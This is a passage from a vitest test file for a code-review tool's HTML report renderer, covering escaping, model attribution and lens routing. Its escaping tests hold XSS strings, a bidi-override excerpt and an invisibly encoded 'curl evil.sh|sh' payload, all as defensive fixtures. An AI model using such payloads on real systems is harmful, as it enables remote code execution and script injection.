import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { beforeAll, describe, expect, it } from "vitest";
import { runAnalyzers } from "../../src/analyze/index.js";
import { suppressionNote } from "../../src/report/coverage.js";
import { renderHtml } from "../../src/report/html.js";
import {
  BEYOND_INTENT_MEANING,
  buildReportModel,
  type ReportMeta,
} from "../../src/report/model.js";
import { createContext, extract } from "../../src/extract/index.js";
import { rank, toFinding } from "../../src/score/index.js";
import { WORKTREE, type Changeset, type Finding } from "../../src/types.js";

const changeset: Changeset = {
  range: { from: "abc123", to: WORKTREE, label: "vs origin/main" },
  files: [
    {
      path: "a.ts",
      status: "modified",
      hunks: [{ oldStart: 1, oldLines: 2, newStart: 1, newLines: 3 }],
      symbols: [
        {
          name: "send",
          qualifiedName: "send",
          kind: "function",
          exported: true,
          range: { startLine: 3, endLine: 9 },
          change: "modified",
        },
        {
          name: "helper",
          qualifiedName: "helper",
          kind: "function",
          exported: false,
          range: { startLine: 20, endLine: 24 },
          change: "added",
        },
      ],
    },
    {
      path: "b.ts",
      status: "modified",
      hunks: [{ oldStart: 5, oldLines: 1, newStart: 5, newLines: 1 }],
      symbols: [],
    },
  ],
};

const noSymbols: Changeset = {
  ...changeset,
  files: changeset.files.map((f) => ({ ...f, symbols: [] })),
};

/**
 * Written as an escape, never as the character itself: a literal concealing
 * character in this file is invisible to the next reader, which is the whole
 * problem this repository exists to make visible. `src/report/conceal.ts`
 * writes its table as code points for the same reason.
 */
const RLO = "\u202E";

const meta = (over: Partial<ReportMeta> = {}): ReportMeta => ({
  warnings: [],
  ...over,
});

/**
 * The changeset is a parameter, never closed over: several tests below render
 * a fixture other than the default, and a helper that hid it would let a
 * rewrite swap one silently.
 */
const model = (cs: Changeset, findings: Finding[], over: Partial<ReportMeta> = {}) =>
  buildReportModel(cs, findings, meta(over));

const finding = (over: Partial<Finding> = {}): Finding => ({
  id: "effect_added:a.ts:network",
  tier: "verified",
  file: "a.ts",
  line: 3,
  title: "introduces a network effect",
  body: "This file previously had no network effect. It now does, at one site.",
  score: 60,
  evidence: [{ file: "a.ts", line: 3, excerpt: "fetch(u);" }],
  ...over,
});

/**
 * One real citation finding, composed by `toFinding` rather than written out
 * here, so this surface is checked against the copy the scorer actually
 * produces and not against a restatement of it.
 */
const citationFinding = (): Finding =>
  toFinding({
    id: "citation_rot:docs/a.md:1:content_drift",
    kind: "citation_rot",
    file: "docs/a.md",
    line: 1,
    detail: {
      rot: "content_drift",
      citedFile: "src/a.ts",
      citedLine: 1,
      was: "export const limit = 1;",
      now: "export const limit = 99;",
      baseline: "3f2a1c9",
    },
    evidence: [
      { file: "docs/a.md", line: 1, excerpt: "The limit is set at src/a.ts:1.", side: "after" },
      { file: "src/a.ts", line: 1, excerpt: "export const limit = 99;", side: "after" },
    ],
  });

/** The contents of every `<script>` element in the document. */
function scripts(html: string): string[] {
  return [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)].map((m) => m[1]);
}

/** The contents of every attributed model-prose block. */
function modelBlocks(html: string): string[] {
  return [...html.matchAll(/<div class="model-block">([\s\S]*?)<\/div>/g)].map((m) => m[1]);
}

function summaries(html: string): string[] {
  return [...html.matchAll(/<summary>([\s\S]*?)<\/summary>/g)].map((m) => m[1]);
}

/** One lens pane's markup, from its opening tag to the next section. */
function lens(html: string, key: string): string {
  const start = html.indexOf(`id="lens-${key}"`);
  expect(start).toBeGreaterThan(-1);
  const rest = html.slice(start);
  const end = rest.indexOf("<section ");
  return end === -1 ? rest : rest.slice(0, end);
}

function count(haystack: string, needle: string): number {
  return haystack.split(needle).length - 1;
}

/** What the renderer's escaping should have made of a string. */
function escaped(text: string): string {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

describe("renderHtml self-containment", () => {
  it("references no remote resource of any kind", () => {
    const html = renderHtml(model(changeset, [finding()], { model: "claude-opus-5" }));
    expect(html).not.toContain("http://");
    expect(html).not.toContain("https://");
    // Protocol-relative and bare-host forms are the same defect wearing a
    // different prefix, and `@import` would fetch even without a scheme.
    expect(html).not.toContain("//cdn");
    expect(html).not.toContain("@import");
    expect(html).not.toMatch(/<link\b/);
    expect(html).not.toMatch(/\bsrc=/);
  });

  it("is one document with a single html root", () => {
    const html = renderHtml(model(changeset, [finding()]));
    expect(html.startsWith("<!doctype html>")).toBe(true);
    expect(count(html, "<html")).toBe(1);
    expect(count(html, "</html>")).toBe(1);
    expect(count(html, "<body")).toBe(1);
    expect(count(html, "<head>")).toBe(1);
  });

  it("carries its own light and dark palette with an explicit body background", () => {
    const html = renderHtml(model(changeset, [finding()]));
    expect(html).toContain("prefers-color-scheme: dark");
    expect(html).toMatch(/body\s*\{[^}]*background:\s*var\(--bg\)/);
  });

  it("scrolls wide content inside its own container", () => {
    const html = renderHtml(model(changeset, [finding()]));
    expect(html).toMatch(/\.excerpt\s*\{[^}]*overflow-x:\s*auto/);
    expect(html).toMatch(/\.table-scroll\s*\{[^}]*overflow-x:\s*auto/);
  });
});

describe("renderHtml header", () => {
  it("carries the change scope", () => {
    const html = renderHtml(model(changeset, [finding()]));
    expect(html).toContain("vs origin/main");
    expect(html).toContain("2 files");
    expect(html).toContain("7 lines changed");
  });

  it("counts each tier", () => {
    const html = renderHtml(
      model(
        changeset,
        [
          finding(),
          finding({ id: "guard_removed:a.ts:9:f:x", tier: "inferred", claim: { summary: "s", reasoning: "r" } }),
          finding({ id: "claim:0:c1", tier: "model", evidence: [] }),
          finding({ id: "claim:1:c2", tier: "model", evidence: [] }),
        ],
        { model: "claude-opus-5" },
      ),
    );
    expect(html).toContain("▲ 1 verified");
    expect(html).toContain("● 1 inferred");
    expect(html).toContain("○ 2 model-only");
  });

  it("says the review is partial and why when a stage was skipped, once", () => {
    // A skipped stage arrives as a warning like any other shortfall — see
    // `review` in `src/cli.ts`, which pushes `result.skipped` into
    // `warnings`. It used to arrive twice, through a second `meta` field too.
    const reason = "--no-llm was set, so the model was not asked";
    const html = renderHtml(model(changeset, [finding()], { warnings: [reason] }));
    expect(html).toContain("This review is partial.");
    expect(count(html, reason)).toBe(1);
  });

  it("shows every warning rather than swallowing it", () => {
    const html = renderHtml(
      model(changeset, [finding()], {
        warnings: ["the surfaceAnalyzer analyzer failed, so this review is partial: boom"],
      }),
    );
    expect(html).toContain("surfaceAnalyzer analyzer failed");
    expect(html.indexOf("surfaceAnalyzer")).toBeLessThan(html.indexOf("introduces a network"));
  });

  it("discloses the standalone-reach filter with the same sentence the terminal prints", () => {
    // Both surfaces must state the filter or neither may claim to — the
    // sentence is single-sourced in `suppressionNote` so they cannot drift.
    const html = renderHtml(model(changeset, [finding()], { suppressed: 2 }));
    expect(html).toContain(suppressionNote(2));
    // A filter disclosure is not a shortfall: the review is complete.
    expect(html).not.toContain("This review is partial.");
  });

  it("says nothing about filtering when nothing was suppressed", () => {
    expect(renderHtml(model(changeset, [finding()]))).not.toContain("Filtered:");
    expect(renderHtml(model(changeset, [finding()], { suppressed: 0 }))).not.toContain("Filtered:");
  });

  it("stays quiet about partiality when nothing went wrong", () => {
    const html = renderHtml(model(changeset, [finding()]));
    expect(html).not.toContain("This review is partial.");
  });

  it("counts untracked files as a reason the review is partial", () => {
    const html = renderHtml(model({ ...changeset, untrackedCount: 2 }, [finding()]));
    expect(html).toContain("2 untracked files not reviewed");
  });

  it("names a deleted TypeScript file without calling the whole review partial", () => {
    // A deletion leaves the file's exports, callers, and guards unexamined,
    // and the report has to say so. It is also routine, so it must not trip
    // the banner that exists for a dead analyzer or an unasked model.
    const html = renderHtml(
      model(
        {
          ...changeset,
          files: [
            ...changeset.files,
            { path: "gone.ts", status: "deleted", hunks: [], symbols: [] },
          ],
        },
        [finding()],
      ),
    );
    expect(html).toContain("1 deleted source file: gone.ts");
    expect(html).not.toContain("This review is partial.");
    // And it no longer claims nothing describes the file — `effectsAnalyzer`
    // can contradict that on the same screen.
    expect(html).not.toContain("every analyzer skips");
  });
});

describe("renderHtml findings", () => {
  it("shows every finding's excerpt", () => {
    const findings = [
      finding({
        evidence: [
          { file: "a.ts", line: 3, excerpt: "fetch(one);" },
          { file: "a.ts", line: 7, excerpt: "fetch(two);" },
          { file: "a.ts", line: 9, excerpt: "fetch(three);" },
        ],
      }),
      finding({ id: "guard_removed:b.ts:5:g:x", file: "b.ts", line: 5, evidence: [{ file: "b.ts", line: 5, excerpt: "if (ok) return;", side: "before" }] }),
    ];
    const html = renderHtml(model(changeset, findings));
    // Unlike the terminal, which shows two and counts the rest: this is the
    // surface a reader opens when the summary was not enough.
    for (const e of findings.flatMap((f) => f.evidence)) {
      expect(html).toContain(e.excerpt);
    }
  });

  it("ranks findings in the order given, numbered from one", () => {
    const html = renderHtml(
      model(changeset, [
        finding({ title: "first" }),
        finding({ id: "effect_added:b.ts:env", title: "second" }),
      ]),
    );
    expect(html.indexOf("first")).toBeLessThan(html.indexOf("second"));
    expect(lens(html, "narrative")).toContain(`<span class="rank">1</span>`);
  });

  it("numbers the narrative but not a filtered lens, where a position is not a rank", () => {
    const html = renderHtml(
      model(changeset, [
        finding(),
        finding({ id: "guard_removed:a.ts:9:f:if", title: "a guard went" }),
      ]),
    );
    expect(lens(html, "narrative")).toContain(`<span class="rank">2</span>`);
    // The guard finding is second overall and first in its section; neither
    // number would tell the truth, so the cell is empty and the order carries it.
    expect(lens(html, "effects")).toContain(`<span class="rank"></span>`);
    expect(lens(html, "effects")).not.toContain(`<span class="rank">1</span>`);
  });

  it("badges every finding with its tier, once per lens it appears in", () => {
    const html = renderHtml(
      model(
        changeset,
        [
          finding(),
          finding({ id: "signature_changed:a.ts:3:send:send", tier: "inferred", claim: { summary: "s", reasoning: "hot path" } }),
          finding({ id: "claim:0:c1", tier: "model", evidence: [] }),
        ],
        { model: "claude-opus-5" },
      ),
    );
    const narrative = lens(html, "narrative");
    expect(count(narrative, "badge-verified")).toBe(1);
    expect(count(narrative, "badge-inferred")).toBe(1);
    expect(count(narrative, "badge-model")).toBe(1);
  });

  it("marks a before-side location so it is not read as a working-tree line", () => {
    const html = renderHtml(
      model(changeset, [
        finding({
          id: "guard_removed:old.ts:119:diff:if",
          file: "old.ts",
          line: 119,
          evidence: [{ file: "old.ts", line: 119, excerpt: "if (seen) continue;", side: "before" }],
        }),
      ]),
    );
    const narrative = lens(html, "narrative");
    expect(narrative).toContain("old.ts:119");
    // The headline and the evidence ref name the same place, so both carry it.
    expect(count(narrative, "chip-before")).toBe(2);
  });

  it("leaves after-side locations unmarked", () => {
    // In the lens, not the whole document: the stylesheet names the class
    // unconditionally, so a document-wide search proves nothing.
    expect(lens(renderHtml(model(changeset, [finding()])), "narrative")).not.toContain(
      "chip-before",
    );
  });

  it("says plainly when a finding has no evidence", () => {
    const html = renderHtml(
      model(changeset, [finding({ id: "claim:0:c1", tier: "model", evidence: [] })], {
        model: "claude-opus-5",
      }),
    );
    expect(html).toContain("No evidence");
  });
});

describe("renderHtml model attribution", () => {
  const REASONING = "This runs on every request, so the cost is per-call.";
  const CLAIM_BODY = "The retry loop has no ceiling and can spin forever.";

  const inferred = finding({
    id: "signature_changed:a.ts:3:send:send",
    tier: "inferred",
    claim: { summary: "hot path", reasoning: REASONING },
  });
  const modelOnly = finding({
    id: "claim:0:c1",
    tier: "model",
    title: "unbounded retry loop",
    body: CLAIM_BODY,
    evidence: [],
  });

  it("marks a model-tier finding unverified and names the model", () => {
    const html = renderHtml(model(changeset, [modelOnly], { model: "claude-opus-5" }));
    expect(html).toContain("unverified");
    expect(html).toContain("claude-opus-5");
    expect(html).toContain("Nothing mechanical corroborates this.");
  });

  it("names the model inside the badge itself, not only in the provenance line", () => {
    // The badge travels with the headline; the provenance line is at the top
    // of the document and scrolls away. A reader who scrolled to finding 11
    // has to be able to see whose claim it is without scrolling back.
    // In the lens, not the header: the legend's badge is a specimen of the
    // badge, with no finding and so no model behind it.
    const narrative = lens(
      renderHtml(model(changeset, [modelOnly], { model: "claude-opus-5" })),
      "narrative",
    );
    const badges = [...narrative.matchAll(/<span class="badge badge-model">([^<]*)<\/span>/g)].map(
      (m) => m[1],
    );
    expect(badges.length).toBeGreaterThan(0);
    for (const badge of badges) {
      expect(badge).toContain("model-only");
      expect(badge).toContain("claude-opus-5");
    }
  });

  it("gives every card a class naming its tier, which is what makes the model tier look different", () => {
    // The dashed border and unfilled background that make a model-tier card
    // read as a different kind of object at a glance hang off this class.
    const html = renderHtml(
      model(changeset, [finding(), inferred, modelOnly], { model: "claude-opus-5" }),
    );
    const narrative = lens(html, "narrative");
    for (const tier of ["verified", "inferred", "model"]) {
      expect(narrative).toContain(`<details class="card card-${tier}"`);
    }
    expect(html).toMatch(/\.card-model \{[^}]*border-style: dashed/);
  });

  it("never renders model prose outside an attributed block", () => {
    const html = renderHtml(model(changeset, [inferred, modelOnly], { model: "claude-opus-5" }));
    const blocks = modelBlocks(html);
    expect(blocks.length).toBeGreaterThan(0);
    for (const block of blocks) {
      expect(block).toContain(`class="model-tag"`);
      expect(block).toContain("unverified");
    }
    // Every occurrence of the prose in the whole document is accounted for
    // by an occurrence inside an attributed block — there is no fourth copy
    // sitting bare somewhere else on the page.
    for (const prose of [REASONING, CLAIM_BODY]) {
      const inBlocks = blocks.reduce((n, b) => n + count(b, prose), 0);
      expect(count(html, prose)).toBe(inBlocks);
      expect(inBlocks).toBeGreaterThan(0);
    }
  });

  it("attributes model prose even when the run recorded no model name", () => {
    // A model-tier finding's whole body is model prose, so suppressing it —
    // the terminal renderer's answer — would leave a headline with nothing
    // under it. The attribution stays, visibly incomplete.
    const html = renderHtml(model(changeset, [inferred, modelOnly]));
    for (const block of modelBlocks(html)) {
      expect(block).toContain("an unnamed model");
    }
    for (const prose of [REASONING, CLAIM_BODY]) {
      const inBlocks = modelBlocks(html).reduce((n, b) => n + count(b, prose), 0);
      expect(count(html, prose)).toBe(inBlocks);
    }
  });

  it("never shows a model-authored headline without a tier badge beside it", () => {
    const html = renderHtml(model(changeset, [modelOnly]));
    const headlines = summaries(html).filter((s) => s.includes("unbounded retry loop"));
    expect(headlines.length).toBeGreaterThan(0);
    for (const head of headlines) {
      expect(head).toContain("badge-model");
      expect(head).toContain("model-only");
    }
  });

  it("names the model in a provenance line when anything is inferred or model-only", () => {
    const html = renderHtml(model(changeset, [inferred], { model: "claude-opus-5" }));
    expect(html).toContain("claude-opus-5 interpreted this change");
  });

  it("omits the provenance line when every finding is verified", () => {
    const html = renderHtml(model(changeset, [finding()], { model: "claude-opus-5" }));
    expect(html).not.toContain("interpreted this change");
  });

  it("says nothing extra for a finding with no claim attached", () => {
    const html = renderHtml(model(changeset, [finding()], { model: "claude-opus-5" }));
    expect(modelBlocks(html)).toHaveLength(0);
  });
});

describe("renderHtml escaping", () => {
  const hostile = finding({
    id: "signature_changed:a.ts:3:send:send",
    tier: "inferred",
    title: `<script>alert("title")</script> & more`,
    body: `Body with <b>markup</b>, an & ampersand, and a "quote".`,
    evidence: [
      {
        file: "a.ts",
        line: 3,
        excerpt: `const f = <T,>(x: T & {a: "b"}) => "<script>alert('x')</script>";`,
      },
    ],
    claim: {
      summary: "s",
      reasoning: `The model wrote <img src=x onerror="alert(1)"> and A && B here.`,
    },
  });

  it("neutralizes markup in every model- and code-authored field", () => {
    const html = renderHtml(model(changeset, [hostile], { model: `claude<&>opus` }));
    expect(html).not.toContain(`alert("title")`);
    expect(html).not.toContain(`<img src=x`);
    expect(html).not.toContain("<b>markup</b>");
    expect(html).toContain("&lt;script&gt;alert(&quot;title&quot;)&lt;/script&gt; &amp; more");
    expect(html).toContain("&lt;b&gt;markup&lt;/b&gt;");
    expect(html).toContain("&lt;img src=x onerror=&quot;alert(1)&quot;&gt;");
    expect(html).toContain("A &amp;&amp; B");
    expect(html).toContain("claude&lt;&amp;&gt;opus");
    // The excerpt's generics and quoted string survive as text.
    expect(html).toContain("(x: T &amp; {a: &quot;b&quot;})");
  });

  it("leaves the document with only its own two scripts", () => {
    const html = renderHtml(model(changeset, [hostile], { model: "claude-opus-5" }));
    expect(scripts(html)).toHaveLength(2);
    expect(count(html, "<script")).toBe(2);
  });

  it("puts no report data inside the inline script", () => {
    const marked = finding({ title: "MARKER_TITLE", body: "MARKER_BODY" });
    const html = renderHtml(model(changeset, [marked], { model: "MARKER_MODEL" }));
    for (const script of scripts(html)) {
      expect(script).not.toContain("MARKER_TITLE");
      expect(script).not.toContain("MARKER_BODY");
      expect(script).not.toContain("MARKER_MODEL");
    }
  });

  it("sets backticked prose as code without letting its contents become markup", () => {
    const html = renderHtml(
      model(
        changeset,
        [
          finding({
            title: "`send` changed",
            body: "The `<script>` tag is what it is called, not what it does.",
            claim: { summary: "s", reasoning: "It reads `process.env.KEY` directly." },
            tier: "inferred",
          }),
        ],
        { model: "claude-opus-5" },
      ),
    );
    expect(html).toContain("<code>send</code>");
    expect(html).toContain("<code>&lt;script&gt;</code>");
    expect(html).toContain("<code>process.env.KEY</code>");
    expect(html).not.toContain("<script>alert");
  });

  it("leaves an unpaired backtick as text", () => {
    const html = renderHtml(model(changeset, [finding({ body: "A lone ` backtick." })]));
    expect(html).toContain("A lone ` backtick.");
  });

  it("shows a bidi override in an excerpt rather than obeying it", () => {
    // Trojan Source: the excerpt below renders as a return of `admin` in any
    // viewer that honours the override, while the bytes say otherwise. A
    // tool whose whole promise is "here is the line, look at it yourself"
    // must not be the viewer that lies.
    const rlo = "\u202E";
    const pdf = "\u202C";
    const html = renderHtml(
      model(changeset, [
        finding({
          evidence: [
            {
              file: "auth.ts",
              line: 7,
              excerpt: `if (isAdmin) { ${rlo} /* nimda si resu ${pdf} */ return true; }`,
            },
          ],
        }),
      ]),
    );
    expect(html).not.toContain(rlo);
    expect(html).not.toContain(pdf);
    expect(html).toContain("U+202E");
    expect(html).toContain("U+202C");
    expect(html).toContain(`class="ctrl"`);
  });

  it("shows zero-width and control characters wherever text is rendered", () => {
    const html = renderHtml(
      model(
        { ...changeset, range: { ...changeset.range, label: "vs \u200Bmain" } },
        [
          finding({
            title: "send\u200D changed",
            body: "It reads \u0007 from the socket.",
            tier: "inferred",
            claim: { summary: "s", reasoning: "The name is send\uFEFF, not send." },
            evidence: [{ file: "a\u200B.ts", line: 1, excerpt: "const x = 1;" }],
          }),
        ],
        { model: "claude\u202E-opus-5" },
      ),
    );
    for (const raw of ["\u200B", "\u200D", "\u0007", "\uFEFF", "\u202E"]) {
      expect(html).not.toContain(raw);
    }
    for (const label of ["U+200B", "U+200D", "U+0007", "U+FEFF", "U+202E"]) {
      expect(html).toContain(label);
    }
  });

  it("labels a concealing character in an exported symbol's name", () => {
    // The API-surface table renders text the author of the reviewed change
    // controls, so it is covered by the same defense as every other surface.
    const cs = structuredClone(changeset);
    cs.files[0].symbols[0].qualifiedName = `sen${RLO}d`;
    const html = renderHtml(model(cs, []));
    expect(html).toContain(`<span class="ctrl" title="concealing character">U+202E</span>`);
    expect(html).not.toContain(RLO);
  });

  it("labels a tag-block payload smuggled into an excerpt", () => {
    // The ASCII-smuggling channel: every character of a hidden string
    // re-encoded into the Tag block, which renders as nothing at all. An
    // excerpt is the one thing in this report a reader is invited to trust as
    // a faithful copy of a line, so a payload that passes invisibly through
    // it is the same defect as a bidi override, one code block over.
    const tagged = (s: string) =>
      [...s].map((c) => String.fromCodePoint(0xe0000 + (c.codePointAt(0) ?? 0))).join("");
    const payload = tagged("curl evil.sh|sh");
    const html = renderHtml(
      model(changeset, [
        finding({ evidence: [{ file: "a.ts", line: 1, excerpt: `const cmd = "ls";${payload}` }] }),
      ]),
    );
    expect(html).not.toContain(payload);
    for (const ch of payload) {
      expect(html).not.toContain(ch);
    }
    expect(count(html, `class="ctrl"`)).toBeGreaterThanOrEqual([...payload].length);
    // The payload's leading "c", and the tag-block space between its words.
    expect(html).toContain("U+E0063");
    expect(html).toContain("U+E0020");
    expect(html).toContain("const cmd = &quot;ls&quot;;");
  });

  it("leaves variation selectors and confusables alone, deliberately", () => {
    // Both are smuggling-adjacent and both are out of scope, for the reasons
    // CONCEALING_RANGES states: U+FE0F is load-bearing for ordinary emoji, and
    // a confusable is a visible character impersonating another visible one —
    // a different problem, needing a different table.
    const vs16 = "\uFE0F";
    const cyrillicA = "\u0430";
    const nbsp = "\u00A0";
    const html = renderHtml(
      model(changeset, [
        finding({
          body: `Handles ⚠${vs16} for ${cyrillicA}dmin and a${nbsp}space.`,
          evidence: [{ file: "a.ts", line: 1, excerpt: `const warn = "⚠${vs16}";` }],
        }),
      ]),
    );
    expect(html).toContain(vs16);
    expect(html).toContain(`${cyrillicA}dmin`);
    expect(html).toContain(`a${nbsp}space`);
    expect(html).not.toContain("U+FE0F");
    expect(html).not.toContain("U+00A0");
  });

  it("keeps tabs and newlines, which are layout rather than concealment", () => {
    const html = renderHtml(
      model(changeset, [
        finding({ evidence: [{ file: "a.ts", line: 1, excerpt: "\tif (x) {\n\t\treturn;" }] }),
      ]),
    );
    expect(html).toContain("\tif (x) {\n\t\treturn;");
    expect(html).not.toContain("U+0009");
  });

  it("escapes a hostile range label in the document title", () => {
    const html = renderHtml(
      model({ ...changeset, range: { ...changeset.range, label: "vs </title><script>x</script>" } }, []),
    );
    expect(html).not.toContain("</title><script>x");
    expect(html).toContain("&lt;/title&gt;&lt;script&gt;x&lt;/script&gt;");
  });
});

describe("renderHtml lenses", () => {
  it("offers exactly the three lenses, narrative first", () => {
    const html = renderHtml(model(changeset, [finding()]));
    expect(html).toContain(`id="lens-narrative"`);
    expect(html).toContain(`id="lens-effects"`);
    expect(html).toContain(`id="lens-surface"`);
    expect(count(html, `class="lens`)).toBe(3);
    expect(html.indexOf(`id="lens-narrative"`)).toBeLessThan(html.indexOf(`id="lens-effects"`));
  });

  it("sorts an effect finding under Effects and a guard under Guards", () => {
    const html = renderHtml(
      model(changeset, [
        finding(),
        finding({ id: "guard_removed:a.ts:9:send:if", title: "an if guard was removed from send" }),
      ]),
    );
    const effects = lens(html, "effects");
    expect(effects).toContain("Effects");
    expect(effects).toContain("Guards");
    expect(effects.indexOf("introduces a network effect")).toBeLessThan(
      effects.indexOf("an if guard was removed"),
    );
  });

  it("lists an exported symbol in the surface lens whether or not a finding flagged it", () => {
    const surface = lens(renderHtml(model(changeset, [])), "surface");
    expect(surface).toContain("send");
    expect(surface).toContain("function");
    // Not exported, so not public surface.
    expect(surface).not.toContain("helper");
  });

  it("says a lens is empty rather than rendering a blank pane", () => {
    const html = renderHtml(model(noSymbols, []));
    expect(lens(html, "narrative")).toContain("No findings to narrate.");
    expect(lens(html, "effects")).toContain("Nothing in this range matched this view");
    expect(lens(html, "surface")).toContain("Nothing in this range matched this view");
  });

  it("describes the filter, not the change, when a lens is empty", () => {
    // An empty lens is what a reader sees if classification ever stops
    // matching what the analyzers emit. It must degrade to "nothing matched
    // this view", never to a claim about the code — that claim would be the
    // tool asserting something false in its own voice, in the one place no
    // tier badge covers.
    const html = renderHtml(model(noSymbols, [finding({ id: "blast_radius:a.ts:send" })]));
    const effects = lens(html, "effects");
    expect(effects).toContain("Nothing in this range matched this view");
    expect(effects).not.toContain("nothing crossed a boundary");
    expect(effects).not.toContain("no promise moved");
    for (const key of ["effects", "surface"]) {
      expect(lens(html, key)).not.toMatch(/No (effects|exported symbol).*(changed|unchanged)/);
    }
  });

  it("keeps a model-only finding out of the analyzer-derived lenses and says so", () => {
    const html = renderHtml(
      model(noSymbols, [finding({ id: "claim:0:c1", tier: "model", title: "a hunch", evidence: [] })], {
        model: "claude-opus-5",
      }),
    );
    expect(lens(html, "narrative")).toContain("a hunch");
    expect(lens(html, "effects")).not.toContain("a hunch");
    expect(lens(html, "effects")).toContain("no analyzer behind it to classify");
    expect(lens(html, "effects")).toContain("A dependency finding");
    expect(lens(html, "effects")).toContain("All four appear in the narrative.");
  });

  it("says the narrative holds lockfile findings too", () => {
    const html = renderHtml(
      model(noSymbols, [finding({ id: "claim:0:c1", tier: "model", title: "a hunch", evidence: [] })], {
        model: "claude-opus-5",
      }),
    );
    expect(lens(html, "effects")).toContain("or to what package-lock.json resolves");
    expect(lens(html, "effects")).toContain("All four appear in the narrative.");
  });

  it("tells the reader a standalone reach finding is in the narrative and not in this lens", () => {
    // `SUBJECT_OF_KIND` classifies blast_radius as "reach", which no section
    // in this lens filters on. That is a decision, so the lens has to say it:
    // the note used to name model-only claims as the sole omission.
    const html = renderHtml(
      model(noSymbols, [
        finding({ id: "blast_radius:a.ts:send", title: "send changed and is referenced in 4 places" }),
      ]),
    );
    expect(lens(html, "narrative")).toContain("referenced in 4 places");
    expect(lens(html, "effects")).not.toContain("referenced in 4 places");
    expect(lens(html, "effects")).toContain("standalone reach finding");
  });

  it("names citation findings in the effects pane's note about what it does not show", () => {
    // The pane's note enumerates the kinds it does not show, and its comment
    // records that naming only one had already misled a reader once. A third
    // kind arriving without a clause would make that sentence false in
    // urtext's own voice, in the one place the tier badges do not reach.
    const html = renderHtml(
      model(noSymbols, [finding({ id: "citation_rot:docs/a.md:1:content_drift" })]),
    );
    const effects = lens(html, "effects");
    // The clause itself, not the bare word "citation": this pane's empty
    // state already says "narrative", so a test satisfied by that would pass
    // with the clause deleted.
    expect(effects).toContain("A citation finding");
    expect(effects).toContain("All four appear in the narrative.");
  });

  it("renders a citation finding's headline, body, and both evidence refs in the narrative", () => {
    const narrative = lens(renderHtml(model(noSymbols, [citationFinding()])), "narrative");
    expect(narrative).toContain(
      `cites <code>src/a.ts:1</code>, which no longer reads the same`,
    );
    expect(narrative).toContain(`It now reads <code>export const limit = 99;</code>.`);
    expect(narrative).toContain(
      `<li><span class="loc">docs/a.md:1</span><pre class="excerpt"><code>The limit is set at src/a.ts:1.</code></pre></li>`,
    );
    expect(narrative).toContain(
      `<li><span class="loc">src/a.ts:1</span><pre class="excerpt"><code>export const limit = 99;</code></pre></li>`,
    );
  });

  it("does not claim the API-surface table covers every exported declaration", () => {
    // `mapSymbols` records no enum member or re-export, and nothing at all
    // for a deleted file, so a table introduced as "every exported
    // declaration this range touched" overclaimed. (Enum declarations
    // themselves are recorded — a member change reaches this table as its
    // enum's row, and the blurb says exactly that much.)
    const pane = lens(renderHtml(model(changeset, [])), "surface");
    expect(pane).toContain("<table");
    expect(pane).not.toContain("Every exported declaration");
    expect(pane).toContain("enum members and re-export declarations are not recorded");
    // `exported` means "carries an `export` modifier at the top level of the
    // file", so a declaration exported by a separate statement is missing from
    // this table too. A list that claims to enumerate the gaps has to name it.
    expect(pane).toContain("exported by a separate");
  });

  it("describes namespace members as recorded-but-not-exports, which is what the symbol map does", () => {
    // The correction to the correction: an earlier version of this sentence
    // said namespaces were not read at all. `declarations()` walks into them
    // and records their members qualified by the namespace — they are simply
    // not module exports, so they do not reach this table.
    const pane = lens(renderHtml(model(changeset, [])), "surface");
    expect(pane).not.toContain("does not read enums, namespaces");
    expect(pane).toContain("recorded under the namespace rather than as exports of the file");
  });

  it("shows all three lenses when scripting is unavailable", () => {
    // The panes are visible markup; only a stylesheet rule keyed on a class
    // the head script sets collapses them to one. Without scripting the
    // class never appears, so nothing is unreachable.
    const html = renderHtml(model(changeset, [finding()]));
    expect(html).toContain(".has-js .lens { display: none; }");
    expect(html).toContain(`.tabs { display: none;`);
  });
});

describe("renderHtml fact-kind routing", () => {
  // Every fact id starts with its kind and a colon, which is what the lenses
  // classify on. A kind that stopped matching would drop out of every lens
  // but the narrative, silently.
  const cases: Array<[string, string, boolean]> = [
    ["effect_added:a.ts:network", "effects", true],
    ["effect_removed:a.ts:network", "effects", true],
    ["guard_removed:a.ts:9:f:if", "effects", true],
    ["export_added:a.ts:3:send:send", "effects", true],
    ["export_removed:a.ts:3:send:send", "effects", true],
    ["signature_changed:a.ts:3:send:send", "effects", true],
    ["export_added_group:a.ts", "effects", true],
    ["signature_changed_group:a.ts", "effects", true],
    ["blast_radius:a.ts:send", "effects", false],
    ["citation_rot:docs/a.md:1:content_drift", "effects", false],
    ["claim:0:c1", "effects", false],
  ];

  for (const [id, key, present] of cases) {
    it(`${present ? "routes" : "keeps"} ${id} ${present ? "into" : "out of"} the ${key} lens`, () => {
      const html = renderHtml(model(changeset, [finding({ id, title: "ROUTED" })]));
      expect(lens(html, key).includes("ROUTED")).toBe(present);
      // Everything reaches the narrative regardless.
      expect(lens(html, "narrative")).toContain("ROUTED");
    });
  }

  it("puts every surface-kind finding in the surface lens too", () => {
    for (const id of [
      "export_added:a.ts:3:send:send",
      "export_removed:a.ts:3:send:send",
      "signature_changed:a.ts:3:send:send",
      "export_added_group:a.ts",
      "signature_changed_group:a.ts",
    ]) {
      const html = renderHtml(model(changeset, [finding({ id, title: "ROUTED" })]));
      expect(lens(html, "surface")).toContain("ROUTED");
    }
  });

  it("keeps an id with no colon out of every filtered lens", () => {
    // `guard_removedX` is one character away from a prefix that routes, and
    // slicing at the sentinel index `indexOf` returns for a missing colon
    // would hand back exactly that prefix.
    const html = renderHtml(model(changeset, [finding({ id: "guard_removedX", title: "ROUTED" })]));
    expect(lens(html, "effects")).not.toContain("ROUTED");
    expect(lens(html, "surface")).not.toContain("ROUTED");
    expect(lens(html, "narrative")).toContain("ROUTED");
  });
});

/**
 * The lenses classify on an id prefix produced by the analyzers, three
 * modules away. A fixture written to match today's format cannot notice
 * tomorrow's changing, and the failure is silent in the worst way: a lens
 * that shows nothing while the finding sits ranked first in the narrative.
 * So this suite drives real analyzers over a real repository and renders
 * what they produce.
 */
describe("renderHtml against real analyzer output", () => {
  let repo: string;

  beforeAll(() => {
    repo = mkdtempSync(join(tmpdir(), "urtext-html-"));
    const git = (args: string[]) =>
